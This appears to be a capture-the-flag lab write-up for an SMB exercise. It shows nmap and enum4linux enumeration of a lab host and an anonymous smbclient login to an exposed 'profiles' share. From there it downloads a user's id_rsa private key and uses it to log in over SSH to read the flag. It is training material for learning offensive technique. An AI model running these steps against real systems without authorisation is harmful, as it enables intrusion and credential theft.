# Network Services SMB

## Task 3 | Enumerating SMB

First scan service with nmap:

````
nmap -sV 10.10.176.114
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 20:13 CET
Nmap scan report for 10.10.176.114
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.37 seconds
````

There you can find that **3 Ports** are open and SMB is running on **Port 139 and 445**.

You also can find the Workgroup **WORKGROUP** and the **Hostname POLOSMB**.

Then we start a Scan with Enum4Linux (Shorted Text):

````
enum4linux -a 10.10.176.114
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec 18 20:15:39 2021

==========================
|    Target Information    |
==========================
Target ........... 10.10.176.114
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


=====================================================
|    Enumerating Workgroup/Domain on 10.10.176.114    |
=====================================================
[+] Got domain/workgroup name: WORKGROUP

=============================================
|    Nbtstat Information for 10.10.176.114    |
=============================================
Looking up status of 10.10.176.114
POLOSMB         <00> -         B <ACTIVE>  Workstation Service
POLOSMB         <03> -         B <ACTIVE>  Messenger Service
POLOSMB         <20> -         B <ACTIVE>  File Server Service
..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

======================================
|    Session Check on 10.10.176.114    |
======================================
[+] Server 10.10.176.114 allows sessions using username '', password ''

============================================
|    Getting domain SID for 10.10.176.114    |
============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

=======================================
|    OS information on 10.10.176.114    |
=======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.176.114 from smbclient:
[+] Got OS info for 10.10.176.114 from srvinfo:
POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
platform_id     :       500
os version      :       6.1
server type     :       0x809a03

==============================
|    Users on 10.10.176.114    |
==============================
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

==========================================
|    Share Enumeration on 10.10.176.114    |
==========================================

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.176.114
//10.10.176.114/netlogon        [E] Can't understand response:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
//10.10.176.114/profiles        Mapping: OK, Listing: OK
//10.10.176.114/print$  Mapping: DENIED, Listing: N/A
//10.10.176.114/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

=====================================================
|    Password Policy Information for 10.10.176.114    |
=====================================================


[+] Attaching to 10.10.176.114 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] POLOSMB
        [+] Builtin

[+] Password Info for Domain: POLOSMB

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5
````

There you can find the **operating system version 6.1**.

Another question is witch share sticks out and thats the **share profiles**.

## Task 4 | Exploiting SMB

We now can anonymously connect to the smb share **/profiles**:

````
smbclient //10.10.176.114/profiles -U Anonymous
Enter WORKGROUP\Anonymous's password:
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Tue Apr 21 13:08:23 2020
..                                  D        0  Tue Apr 21 12:49:56 2020
.cache                             DH        0  Tue Apr 21 13:08:23 2020
.profile                            H      807  Tue Apr 21 13:08:23 2020
.sudo_as_admin_successful           H        0  Tue Apr 21 13:08:23 2020
.bash_logout                        H      220  Tue Apr 21 13:08:23 2020
.viminfo                            H      947  Tue Apr 21 13:08:23 2020
Working From Home Information.txt      N      358  Tue Apr 21 13:08:23 2020
.ssh                               DH        0  Tue Apr 21 13:08:23 2020
.bashrc                             H     3771  Tue Apr 21 13:08:23 2020
.gnupg                             DH        0  Tue Apr 21 13:08:23 2020

12316808 blocks of size 1024. 7584024 blocks available
````

There we can get the file "Working From Home Information.txt" in witch we can see that **John Cactus** wrote it:

````
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager
````

Then we can look into the interesting folder **.ssh** where we can see those files:

````
smb: \> cd .ssh\
smb: \.ssh\> ls
.                                   D        0  Tue Apr 21 13:08:23 2020
..                                  D        0  Tue Apr 21 13:08:23 2020
id_rsa                              A     1679  Tue Apr 21 13:08:23 2020
id_rsa.pub                          N      396  Tue Apr 21 13:08:23 2020
authorized_keys                     N        0  Tue Apr 21 13:08:23 2020

12316808 blocks of size 1024. 7584024 blocks available
````

We are interested in the file **id_rsa** and **id_rsa.pub**.

Download it to our client with the command *get id_rsa* and *get id_rsa.pub*.

In the file *get id_rsa.pub* you can see the *ssh username cactus*.

We now can set the permissions for the rsa key with *chmod 600 id_rsa* and connect with ssh with *ssh cactus@10.10.176.114*.

In the home directory of cactus w can find the file smb.txt with the flag